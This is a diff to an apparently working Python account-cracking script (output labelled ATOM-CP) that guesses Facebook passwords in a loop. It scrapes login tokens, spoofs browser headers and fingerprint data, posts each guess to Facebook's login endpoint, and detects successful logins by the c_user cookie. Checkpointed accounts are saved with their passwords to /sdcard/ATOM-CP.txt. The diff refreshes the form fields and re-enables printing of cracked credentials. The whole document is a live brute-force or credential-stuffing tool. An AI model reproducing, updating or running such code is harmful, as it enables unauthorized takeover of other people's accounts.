@@ -1259,46 +1259,49 @@ def mbasic(uid,pwx,tl):
     sys.stdout.flush()
     try:
         for pw in pwx:
-            nip=random.choice(xvx)
-            proxs= {'http': nip}
             Session = requests.Session()
-            free_fb = Session.get('https://www.facebook.com/facebook').text#re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1), "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
+            free_fb = Session.get('https://touch.facebook.com/login').text #re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1), "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
             data = {
-            'email': uid,
-            'cuid': '',
-            'guid': 'fe9e7269eab75451d',
-            'lgnjs': '1782111831',
-            'lgnrnd': '000350_BYK8',
-            'locale': 'en_GB',
-            'login_source': 'comet_login_header',
-            'next': 'https://www.facebook.com/facebook',
-            'skstamp': '',
+            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            'display': '',
+            'isprivate': '',
+            'return_session': '',
+            'skip_api_login': '',
+            'signed_next': '',
+            'trynum': '24',
             'timezone': '-330',
-            'prefill_contact_point': '',
-            'prefill_source': '',
-            'fb_dtsg': 'wX4Bl7NejyQ=',
-            'jazoest': '21036',
             'lgndim': 'eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjoyNH0=',
-            'ab_test_data': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA',
+            'lgnrnd': '010542_geoh',
+            'lgnjs': '1787645142',
+            'shared_prefs_data': 'eyIxMTAyMCI6W3sidCI6MTc4NzY0NTE0Mi4zODIsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6IkFzaWEvQ2FsY3V0dGEifV0sIjMwMDAwIjpbeyJ0IjoxNzg3NjQ1MTQyLjM4MywiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2IjpmYWxzZX1dLCIzMDAwMSI6W3sidCI6MTc4NzY0NTE0Mi4zODMsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6NX1dLCIzMDAwMiI6W3sidCI6MTc4NzY0NTE0Mi4zODMsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6Mn1dLCIzMDAwMyI6W3sidCI6MTc4NzY0NTE0Mi4zODMsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6WyJlbi1VUyIsImVuIl19XSwiMzAwMDQiOlt7InQiOjE3ODc2NDUxNDIuMzg0LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOjE1MH1dLCIzMDAwNSI6W3sidCI6MTc4NzY0NTE0Mi4zODQsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6eyJ3IjoxNDQwLCJoIjo3NzN9fV0sIjMwMDA2IjpbeyJ0IjoxNzg3NjQ1MTQyLjM4NCwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2Ijp0cnVlfV0sIjMwMDA3IjpbeyJ0IjoxNzg3NjQ1MTQyLjM4NCwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2IjoiZGVuaWVkIn1dLCIzMDAwOCI6W3sidCI6MTc4NzY0NTE0Mi40MjEsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6ImRlbmllZCJ9XSwiMzAwMTIiOlt7InQiOjE3ODc2NDUxNDIuMzg1LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOiJHb29nbGUgSW5jLiJ9XSwiMzAwMTMiOlt7InQiOjE3ODc2NDUxNDIuMzg1LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOiI1LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzOS4wLjAuMCBTYWZhcmkvNTM3LjM2In1dLCIzMDAxNSI6W3sidCI6MTc4NzY0NTE0Mi4zODUsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6IldpbjMyIn1dLCIzMDAxOCI6W3sidCI6MTc4NzY0NTE0Mi4zODUsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6Mn1dLCIzMDAyMiI6W3sidCI6MTc4NzY0NTE0Mi4zOTksImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6dHJ1ZX1dLCIzMDA0MCI6W3sidCI6MTc4NzY0NTE0Mi4zOTksImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6LTMzMH1dLCIzMDA5MyI6W3sidCI6MTc4NzY0NTE0Mi4zOTksImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6MH1dLCIzMDA5NCI6W3sidCI6MTc4NzY0NTE0Mi4zOTksImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzkuMC4wLjAgU2FmYXJpLzUzNy4zNiJ9XSwiMzAwOTUiOlt7InQiOjE3ODc2NDUxNDIuMzk5LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOjI5fV0sIjMwMTA2IjpbeyJ0IjoxNzg3NjQ1MTQyLjM2MiwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2IjpmYWxzZX0seyJ0IjoxNzg3NjQ1MTQyLjQxOCwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2Ijp0cnVlfV0sIjMwMTA3IjpbeyJ0IjoxNzg3NjQ1MTQyLjM2MiwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2IjpmYWxzZX1dLCIzMDEwOSI6W3sidCI6MTc4NzY0NTE0Mi43MzIsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6IjMyYzQ3ZTZmYTk0NDZlYjRiYWUxZGJhMDU0OGJiZGZhMzFhYzlmZDdlNjJiNjI5NmQ1MGYwZjJkY2M1MGM4NzQifV19',
+            'email': uid,
+            'prefill_contact_point': '6297287419|6297287419',
+            'prefill_source': 'browser_dropdown',
+            'prefill_type': 'password',
+            'first_prefill_source': 'browser_dropdown',
+            'first_prefill_type': 'contact_point',
+            'had_cp_prefilled': 'true',
+            'had_password_prefilled': 'true',
+            'ab_test_data': 'AfAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAA///A//ABAAD',
             'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
             headers = {
-            'Accept-Language': 'en-US,en;q=0.9',
             'Content-Type': 'application/x-www-form-urlencoded',
             'Origin': 'https://www.facebook.com',
-            'Referer': 'https://www.facebook.com/facebook',
+            'Referer': 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fwww.facebook.com%2Fdafword%2F&lwv=120&lwc=1348028',
             'Upgrade-Insecure-Requests': '1',
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
             'dpr': '1',
             'sec-ch-prefers-color-scheme': 'dark',
-            'sec-ch-ua': '"Not_A Brand";v="99", "Chromium";v="142"',
-            'sec-ch-ua-full-version-list': '"Not_A Brand";v="99.0.0.0", "Chromium";v="142.0.7444.164"',
+            'sec-ch-ua': '"Not;A=Brand";v="99", "Google Chrome";v="139", "Chromium";v="139"',
+            'sec-ch-ua-full-version-list': '"Not;A=Brand";v="99.0.0.0", "Google Chrome";v="139.0.7258.139", "Chromium";v="139.0.7258.139"',
             'sec-ch-ua-mobile': '?0',
             'sec-ch-ua-model': '""',
             'sec-ch-ua-platform': '"Windows"',
             'sec-ch-ua-platform-version': '"10.0.0"',
-            'viewport-width': '783',}
+            'viewport-width': '1147',}
             twf = "login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1'
+            url = 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fwww.facebook.com%2Fdafword%2F&lwv=120&lwc=1348131'
             po = Session.post(url, data=data, headers=headers, allow_redirects=False).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
@@ -1316,7 +1319,7 @@ def mbasic(uid,pwx,tl):
                     break
             elif 'checkpoint' in response:
                 uid = Session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
-                #print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
+                print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
                 open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
                 cps.append(uid)
                 break
